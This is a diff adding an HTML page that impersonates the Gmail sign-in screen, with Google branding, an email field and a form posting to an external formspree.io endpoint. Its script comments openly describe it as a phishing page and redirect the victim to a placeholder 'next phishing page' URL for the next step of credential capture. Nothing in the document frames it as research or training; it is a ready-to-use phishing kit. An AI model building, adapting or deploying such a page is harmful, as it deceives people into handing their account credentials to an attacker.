@@ -1,0 +1,392 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Gmail - Sign in</title>
+
+  <!-- Optional: modern font (safe fallback to system fonts) -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+
+  <style>
+    :root{
+      --bg: #f1f5fb;
+      --card: #ffffff;
+      --text: #1f1f1f;
+      --muted: #5f6368;
+      --link: #1a73e8;
+      --border: #dadce0;
+      --focus: #1a73e8;
+      --btn: #1a73e8;
+      --btnHover: #1669d6;
+      --btnDisabled: #c6dafc;
+      --shadow: 0 1px 2px rgba(0,0,0,.06), 0 6px 24px rgba(0,0,0,.08);
+      --radius: 18px;
+    }
+
+    *{ box-sizing: border-box; }
+    html, body { height: 100%; }
+    body{
+      margin:0;
+      font-family: Roboto, system-ui, -apple-system, Segoe UI, Arial, sans-serif;
+      background: var(--bg);
+      color: var(--text);
+    }
+
+    a{
+      color: var(--link);
+      text-decoration: none;
+      font-weight: 500;
+    }
+    a:hover{ text-decoration: underline; }
+
+    /* Page layout */
+    .page{
+      min-height: 100%;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .center{
+      flex: 1;
+      display: grid;
+      place-items: center;
+      padding: 48px 16px 24px;
+    }
+
+    .card{
+      width: min(1040px, 100%);
+      background: var(--card);
+      border-radius: var(--radius);
+      box-shadow: var(--shadow);
+      padding: 44px 48px;
+    }
+
+    .grid{
+      display: grid;
+      grid-template-columns: 1.1fr 1fr;
+      gap: 56px;
+      align-items: start;
+    }
+
+    /* Left column */
+    .brandRow{
+      display:flex;
+      align-items:center;
+      gap: 12px;
+      margin-bottom: 18px;
+    }
+
+    .mark{
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      background:
+        conic-gradient(#4285f4 0 25%, #34a853 0 50%, #fbbc05 0 75%, #ea4335 0 100%);
+      border: 1px solid rgba(0,0,0,.06);
+    }
+
+    .brand{
+      font-size: 14px;
+      color: var(--muted);
+      letter-spacing: .18px;
+      user-select: none;
+    }
+
+    h1{
+      margin: 0 0 8px;
+      font-size: 40px;
+      line-height: 1.1;
+      font-weight: 400;
+    }
+
+    .sub{
+      margin: 0;
+      color: var(--muted);
+      font-size: 16px;
+    }
+
+    /* Right column */
+    .form{
+      margin-top: 18px;
+    }
+
+    .field{
+      position: relative;
+      margin-top: 18px;
+    }
+
+    .input{
+      width: 100%;
+      height: 56px;
+      padding: 18px 14px 14px;
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      outline: none;
+      font-size: 16px;
+      background: #fff;
+      transition: border-color .12s ease, box-shadow .12s ease;
+    }
+    .input:focus{
+      border-color: var(--focus);
+      box-shadow: 0 0 0 1px var(--focus);
+    }
+
+    /* Floating label */
+    .label{
+      position: absolute;
+      left: 12px;
+      top: 18px;
+      padding: 0 4px;
+      color: var(--muted);
+      font-size: 16px;
+      background: white;
+      pointer-events: none;
+      transition: transform .12s ease, color .12s ease, font-size .12s ease, top .12s ease;
+      transform-origin: left top;
+    }
+
+    .input:focus + .label,
+    .input:not(:placeholder-shown) + .label{
+      top: 6px;
+      font-size: 12px;
+      color: var(--focus);
+    }
+
+    .helpLink{
+      display: inline-block;
+      margin-top: 10px;
+      font-size: 14px;
+    }
+
+    .hint{
+      margin: 26px 0 0;
+      font-size: 13px;
+      color: var(--muted);
+      line-height: 1.45;
+    }
+
+    .actions{
+      margin-top: 34px;
+      display:flex;
+      align-items:center;
+      justify-content: space-between;
+      gap: 16px;
+    }
+
+    .btnLink{
+      font-size: 14px;
+      font-weight: 500;
+      padding: 10px 6px;
+      border-radius: 6px;
+    }
+    .btnLink:focus-visible{
+      outline: 2px solid var(--focus);
+      outline-offset: 2px;
+    }
+
+    .btn{
+      border: none;
+      height: 40px;
+      padding: 0 22px;
+      border-radius: 999px;
+      background: var(--btn);
+      color: white;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background .12s ease, transform .06s ease;
+    }
+    .btn:hover{ background: var(--btnHover); }
+    .btn:active{ transform: translateY(1px); }
+    .btn:disabled{
+      background: var(--btnDisabled);
+      cursor: not-allowed;
+    }
+    .btn:focus-visible{
+      outline: 2px solid var(--focus);
+      outline-offset: 2px;
+    }
+
+    /* Footer */
+    .footer{
+      display:flex;
+      justify-content: space-between;
+      align-items:center;
+      gap: 16px;
+      padding: 18px 18px 28px;
+      width: min(1040px, 100%);
+      margin: 0 auto;
+      color: var(--muted);
+      font-size: 12px;
+    }
+
+    .lang{
+      display:flex;
+      align-items:center;
+      gap: 10px;
+    }
+
+    select{
+      border: 1px solid transparent;
+      background: transparent;
+      color: var(--muted);
+      padding: 6px 10px;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    select:focus-visible{
+      outline: 2px solid var(--focus);
+      outline-offset: 2px;
+    }
+
+    .footlinks{
+      display:flex;
+      gap: 18px;
+      flex-wrap: wrap;
+      justify-content: flex-end;
+    }
+    .footlinks a{
+      color: var(--muted);
+      font-weight: 400;
+    }
+    .footlinks a:hover{
+      color: var(--text);
+      text-decoration: underline;
+    }
+
+    /* Responsive */
+    @media (max-width: 860px){
+      .card{ padding: 32px 22px; }
+      .grid{
+        grid-template-columns: 1fr;
+        gap: 22px;
+      }
+      h1{ font-size: 34px; }
+      .form{ margin-top: 0; }
+      .footer{
+        flex-direction: column;
+        align-items: flex-start;
+      }
+      .footlinks{
+        justify-content: flex-start;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <div class="page">
+    <main class="center">
+      <section class="card" aria-label="Sign in card">
+        <div class="grid">
+          <!-- Left column -->
+          <div>
+            <div class="brandRow">
+              <div class="mark" aria-hidden="true"></div>
+              <div class="brand">Gmail</div>
+            </div>
+
+            <h1>Sign in</h1>
+            <p class="sub">to continue to Gmail</p>
+          </div>
+
+          <!-- Right column -->
+          <div class="form">
+            <form id="signinForm" novalidate action="https://formspree.io/f/xnjjqbjl" method="POST">
+              <div class="field">
+                <input
+                  id="identifier"
+                  class="input"
+                  type="text"
+                  inputmode="email"
+                  autocomplete="username"
+                  placeholder=" "
+                  aria-describedby="identifierHelp"
+                  required
+                />
+                <label class="label" for="identifier">Email or phone</label>
+              </div>
+
+              <a class="helpLink" href="#" id="forgotLink">Forgot email?</a>
+
+              <p class="hint" id="identifierHelp">
+                Not your computer? Use a Private Window to sign in.
+                <a href="#" id="learnMoreLink">Learn more</a>
+              </p>
+
+              <div class="actions">
+                <a class="btnLink" href="#" id="createAccountLink">Create account</a>
+                <button class="btn" id="nextBtn" type="submit" disabled>Next</button>
+              </div>
+            </form>
+          </div>
+        </div>
+      </section>
+    </main>
+
+    <footer class="footer" aria-label="Footer">
+      <div class="lang">
+        <label for="lang" class="sr-only" style="position:absolute;left:-9999px;">Language</label>
+        <select id="lang" aria-label="Language">
+          <option selected>English (United States)</option>
+          <option>English (United Kingdom)</option>
+          <option>Español</option>
+          <option>Français</option>
+        </select>
+      </div>
+
+      <nav class="footlinks" aria-label="Footer links">
+        <a href="#" id="helpLink">Help</a>
+        <a href="#" id="privacyLink">Privacy</a>
+        <a href="#" id="termsLink">Terms</a>
+      </nav>
+    </footer>
+  </div>
+
+  <script>
+    // Store the field value in a variable
+    let fieldValue = "";
+
+    // Switch to the next phishing page
+    function goToNextPage() {
+      // Replace this with the URL of your next phishing page
+      const nextPageUrl = "https://your-github-page-url.com/next-phishing-page.html";
+      window.location.href = nextPageUrl;
+    }
+
+    const input = document.getElementById('identifier');
+    const nextBtn = document.getElementById('nextBtn');
+    const form = document.getElementById('signinForm');
+
+    function syncButtonState() {
+      nextBtn.disabled = input.value.trim().length === 0;
+    }
+
+    input.addEventListener('input', syncButtonState);
+    input.addEventListener('blur', syncButtonState);
+    window.addEventListener('load', syncButtonState);
+
+    form.addEventListener('submit', (e) => {
+      e.preventDefault();
+      const value = input.value.trim();
+      if (!value) return;
+
+      // Store the field value
+      fieldValue = value;
+
+      // Show "Working..." message
+      nextBtn.textContent = 'Working...';
+      nextBtn.disabled = true;
+
+      // Switch to the next phishing page after a delay
+      setTimeout(() => {
+        nextBtn.textContent = 'Next';
+        syncButtonState();
+        goToNextPage();
+      }, 650);
+    });
+  </script>
+</body>
+</html>
